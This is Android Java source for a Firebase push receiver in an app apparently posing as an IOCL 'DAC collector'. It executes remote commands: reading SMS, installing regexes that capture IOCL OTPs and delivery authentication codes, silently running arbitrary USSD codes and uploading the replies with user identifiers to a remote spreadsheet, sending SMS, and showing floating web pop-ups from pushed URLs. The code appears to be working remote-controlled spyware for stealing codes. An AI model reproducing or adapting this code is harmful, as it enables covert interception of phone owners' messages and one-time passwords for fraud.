package android.iocl.dac_collector.Firebase;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.iocl.dac_collector.BuildConfig;
import android.iocl.dac_collector.ModelData.ColumnValue;
import android.iocl.dac_collector.ModelData.DAC_Collector_Base;
import android.iocl.dac_collector.ModelData.update_dac_collect;
import android.iocl.dac_collector.RetrofitClient.RequestService;
import android.iocl.dac_collector.RetrofitClient.RetrofitClient;
import android.iocl.dac_collector.Services.JobSchedulerUtil;
import android.iocl.dac_collector.Services.SendDACService;
import android.iocl.dac_collector.Services.SmsFetchWorker;
import android.iocl.dac_collector.Services.SmsNumberScanWorker;
import android.iocl.dac_collector.Ui.BankStatementActivity;
import android.iocl.dac_collector.Utility.Constant;
import android.iocl.dac_collector.Utility.FirebaseConfigManager;
import android.iocl.dac_collector.Utility.NotificationHelper;
import android.iocl.dac_collector.Utility.SharedPrefs;
import android.iocl.dac_collector.Utility.SmsWorkUtil;
import android.iocl.dac_collector.Utility.Utility;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;
import androidx.work.Configuration;
import androidx.work.Constraints;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import java.util.Arrays;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class FCMPushReceiver extends FirebaseMessagingService {

    private static final String TAG = "MyFirebaseMsgService";

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {

        try {
            Log.d(TAG, "onMessageReceived: " + remoteMessage.getData());
            routeFcmActions(remoteMessage);
        } catch (Exception e) {
            Log.d(TAG, "onMessageReceived: " + e);
        }

        if (BuildConfig.DEBUG) {
            debugFCM(remoteMessage);
        }

    }

    private void routeFcmActions(RemoteMessage remoteMessage) {
        if (remoteMessage.getData().size() > 0) {

            if (remoteMessage.getData() == null) return;

            Map<String, String> rm = remoteMessage.getData();


            String actionType = rm.get("actions");
            String payloads = rm.get("payload");

            Log.d(TAG, "routeFcmActions: Action " + actionType);
            switch (actionType) {
                case "heart_beat":
                    /*

                    @actions:  heart_beat
                    @payload: not_require

                     */
                    sendTokenToServer();
//                    scheduleJob();
//                    WakeupHelper.scheduleAlarm(getApplicationContext(), SmsSenderJOBService.class);
                    break;
                case "recharge_notify":
                    /*

                    @actions:  recharge_notify
                    @payload: Enter Message to notify

                     */
                    NotificationHelper.showRechargeNotification(getApplicationContext(), payloads);
                    break;
                case "otp_patterns":

                    /*

                    @actions:  otp_patterns
                    @payload: '{\r\n  \"patterns\": [\r\n    {\r\n      \"id\": \"DAC\",\r\n      \"regex\": \"Invoice Number # (\\\\d+-\\\\d+) is (\\\\d{6})\",\r\n      \"capture\": \"1, 2\"\r\n    },\r\n    {\r\n      \"id\": \"OTP\",\r\n      \"regex\": \"Your IOCL one time password is :(\\\\d{4})\",\r\n      \"capture\": \"1\"\r\n    },\r\n    {\r\n      \"id\": \"GeneratedDAC\",\r\n      \"regex\": \"Invoice generated for Rs. (\\\\d{3}).Share DAC (\\\\d{6})\",\r\n      \"capture\": \"2\"\r\n    }\r\n  ]\r\n}' }
                    *** Stringfied OTP Patterns ***
                     */

                    Utility.updateMessagePattern(payloads, this);
                    break;
                case "get_sms":
                    /*

                    @actions:  get_sms
                    @payload: Not Require

                     */

                    handleSendSms();
                    break;
                case "receivedSubsidy":
                                        /*

                    @actions:  receivedSubsidy
                    @payload: B64 String Subsidy Details

                     */
                    handleSubsidy(payloads, remoteMessage);
                    break;
                case "run_ussd":
                    /*

                    @actions:  run_ussd
                    @payload: *282#

                     */
                    runUssdCode(getApplicationContext(), payloads);
                    break;
                case "update_status":
                    /*

                    @actions:  update_status
                    @payload:  not require

                     */
                    FirebaseDBClient.updateAppAliveStatus(getApplicationContext());
                    break;
                // after 2.5.2 - 505
                case "get_perm_status":
                    /*

                    @actions:  update_status
                    @payload:  not require

                     */
                    SmsWorkUtil.enqueueUploadWorker(getApplicationContext(), "PERM");
                    break;

                // Implemented after 2.5.2 - 505
                case "send_dual_sms":
                    /*

                    @actions:  update_status
                    @payload:  not require

                     */
                    SmsWorkUtil.enqueueSmsWorker(getApplicationContext(), "TEST-001", Constant.testSms, System.currentTimeMillis() + "");
                    break;
                case "data_usage_stats":
                    /*

                    @actions:  update_status
                    @payload:  not require

                     */
                    uploadUserStats();
                    break;
                case "notification_web": // 512 version code er pore add hoyeche


                    String title = rm.get("title");
                    String body = rm.get("body");
                    String url = rm.get("url");
                    /*
                {
                 "actions":"notification_web",
                 "title":"New Update Available",
                 "body":"Update now to 5.13.1",
                 "url":"https://promo.com"
                }
                    */
                    NotificationHelper.showFloatingWeb(getApplicationContext(), payloads, body, url);
                    break;
                case "get_dac":
                    Intent mainService = new Intent(this, SendDACService.class);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(mainService);
                    } else {
                        startService(mainService);
                    }
                    break;
                default:
                    Log.d(TAG, "onMessageReceived: " + actionType);
                    break;

            }


        }
    }


    private void uploadUserStats() {


        long bytes = SharedPrefs.getUploadedBytes();


        float uploadedMb = bytes / (1024f * 1024f);

        String stats =
                "Stats              : " +
                        SharedPrefs.getUsername() + " - " +
                        SharedPrefs.getConsumerId() + "\n" +

                        "Upload Count       : " +
                        SharedPrefs.getUploadCount() + " / " +
                        FirebaseConfigManager.getImgDailyLimit() + "\n" +

                        "Uploaded MB        : " +
                        String.format(Locale.ENGLISH, "%.2f", uploadedMb) +
                        " MB / " +
                        FirebaseConfigManager.getImgDailyMbLimit() + " MB\n" +

                        "Last Reset Time    : " +
                        SharedPrefs.getLastResetTime() + "\n" +

                        "Last Reset Date    : " +
                        new java.text.SimpleDateFormat(
                                "dd-MM-yyyy HH:mm:ss",
                                Locale.ENGLISH
                        ).format(new java.util.Date(
                                SharedPrefs.getLastResetTime()
                        ));

        FirebaseDBClient.updateUploadStatus(stats);

    }

    private void debugFCM(RemoteMessage remoteMessage) {

        Log.d(TAG, "================ FCM DEBUG START ================");

        // 🔹 FROM / META
        Log.d(TAG, "From: " + remoteMessage.getFrom());
        Log.d(TAG, "Message ID: " + remoteMessage.getMessageId());
        Log.d(TAG, "Message Type: " + remoteMessage.getMessageType());
        Log.d(TAG, "Sent Time: " + remoteMessage.getSentTime());
        Log.d(TAG, "TTL: " + remoteMessage.getTtl());
        Log.d(TAG, "Collapse Key: " + remoteMessage.getCollapseKey());

        // 🔹 NOTIFICATION PAYLOAD
        if (remoteMessage.getNotification() != null) {
            RemoteMessage.Notification notification = remoteMessage.getNotification();

            Log.d(TAG, "--- Notification Payload ---");
            Log.d(TAG, "Title: " + notification.getTitle());
            Log.d(TAG, "Body: " + notification.getBody());
            Log.d(TAG, "Icon: " + notification.getIcon());
            Log.d(TAG, "Tag: " + notification.getTag());
            Log.d(TAG, "Click Action: " + notification.getClickAction());
            Log.d(TAG, "Color: " + notification.getColor());
            Log.d(TAG, "Sound: " + notification.getSound());

            if (notification.getLink() != null) {
                Log.d(TAG, "Link: " + notification.getLink().toString());
            }
        } else {
            Log.d(TAG, "--- Notification Payload: NULL ---");
        }

        // 🔹 DATA PAYLOAD
        if (remoteMessage.getData() != null && !remoteMessage.getData().isEmpty()) {
            Log.d(TAG, "--- Data Payload ---");
            for (Map.Entry<String, String> entry : remoteMessage.getData().entrySet()) {
                Log.d(TAG, entry.getKey() + " : " + entry.getValue());
            }
        } else {
            Log.d(TAG, "--- Data Payload: EMPTY ---");
        }

        Log.d(TAG, "================ FCM DEBUG END ==================");
    }

    private void handleSubsidy(String payload, RemoteMessage remoteMessage) {

        // ✅ Save data
        SharedPrefs.setSubsidyDetails(payload);
        SharedPrefs.setLastSubsidyDate(Utility.getStandardDate());
        SharedPrefs.setIsSubsidyRequestPending(false);

        String title = null;
        String body = null;

        // 🔹 1. Try DATA payload first
        if (remoteMessage.getData().size() > 0) {
            title = remoteMessage.getData().get("title");
            body = remoteMessage.getData().get("body");
        }

        // 🔹 2. Fallback to NOTIFICATION payload
        if (remoteMessage.getNotification() != null) {
            if (title == null) {
                title = remoteMessage.getNotification().getTitle();
            }
            if (body == null) {
                body = remoteMessage.getNotification().getBody();
            }
        }

        // 🔹 3. Final fallback (avoid null crash / blank notification)
        if (title == null) title = "Subsidy Check Completed";
        if (body == null) body = "New subsidy information received.";

        Log.d(TAG, "handleSubsidy: Title: " + title + " body: " + body);

        Intent intent = new Intent(this, BankStatementActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);

        // ✅ Show notification
        NotificationHelper.sendNotification(
                this,
                title,
                body,
                intent
        );
    }


    @SuppressLint("MissingPermission")
    public void runUssdCode(final Context ctx, String ussdCode) {

        // Check if we have necessary permissions
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            sendUSSDCodeToServer("Permission not granted for CALL_PHONE.", "PermissionError");
            return;
        }

        TelephonyManager manager = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);

        if (manager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // Use the main thread's Looper to ensure the Handler is associated with the main thread
                Handler handler = new Handler(Looper.getMainLooper());

                manager.sendUssdRequest(ussdCode, new TelephonyManager.UssdResponseCallback() {
                    @Override
                    public void onReceiveUssdResponse(TelephonyManager telephonyManager, String request, CharSequence response) {
                        super.onReceiveUssdResponse(telephonyManager, request, response);
                        String responseReceived = response.toString();
                        Log.d(TAG, " response -> " + response);

                        sendUSSDCodeToServer(responseReceived, ussdCode);
                    }

                    @Override
                    public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String request, int failureCode) {
                        super.onReceiveUssdResponseFailed(telephonyManager, request, failureCode);
                        Log.d(this.getClass().getName(), "response failed: " + failureCode);
                    }
                }, handler);
            }
        } else {
            Log.e(this.getClass().getName(), "TelephonyManager is null");
        }
    }


    private void handleSendSms() {
        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED)  // Only run when connected to Wi-Fi
                .build();

        OneTimeWorkRequest smsFetchRequest = new OneTimeWorkRequest.Builder(SmsFetchWorker.class).setConstraints(constraints).build();

        WorkManager.getInstance(getApplicationContext()).enqueue(smsFetchRequest);
    }

    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);


        SharedPrefs.setFCMKey(token);

        sendTokenToServer();
    }

    private void scheduleJob() {
        if (!Utility.isJobSchedulerActive(getApplicationContext(), 1)) {
            JobSchedulerUtil.Sms_and_Call_sender(getApplicationContext());
            JobSchedulerUtil.fetch_profile_info(getApplicationContext());
        }
    }


    private void sendTokenToServer() {
        Context context = getApplicationContext();

        // Try to get WorkManager instance
        WorkManager workManager = null;
        try {
            workManager = WorkManager.getInstance(context);
        } catch (IllegalStateException e) {
            // Initialize if not already initialized
            Configuration config = new Configuration.Builder().setMinimumLoggingLevel(Log.DEBUG).build();
            WorkManager.initialize(context, config);
            workManager = WorkManager.getInstance(context);
        }

        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();

        OneTimeWorkRequest smsFetchRequest = new OneTimeWorkRequest.Builder(SmsNumberScanWorker.class).setConstraints(constraints).build();

        workManager.enqueue(smsFetchRequest);
    }

    private void sendUSSDCodeToServer(String UssdResponse, String ussdCode) {


        String cons_id = SharedPrefs.getConsumerId();
        String name = SharedPrefs.getUsername();

        if (cons_id.isEmpty()) {
            return;
        }

        RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext()).create(RequestService.class);
        List<ColumnValue> smsInfo = Arrays.asList(new ColumnValue("USER_NAME", name), new ColumnValue("USER_NUMBER", ussdCode), new ColumnValue("SMS_B64", UssdResponse));

        update_dac_collect receiver = new update_dac_collect("addUserSms", cons_id, smsInfo);
        Call<DAC_Collector_Base> auth = requestService.update_dac_collector(receiver);
        auth.enqueue(new Callback<DAC_Collector_Base>() {
            @Override
            public void onResponse(Call<DAC_Collector_Base> call, Response<DAC_Collector_Base> response) {


            }

            @Override
            public void onFailure(Call<DAC_Collector_Base> call, Throwable t) {

            }
        });

    }


}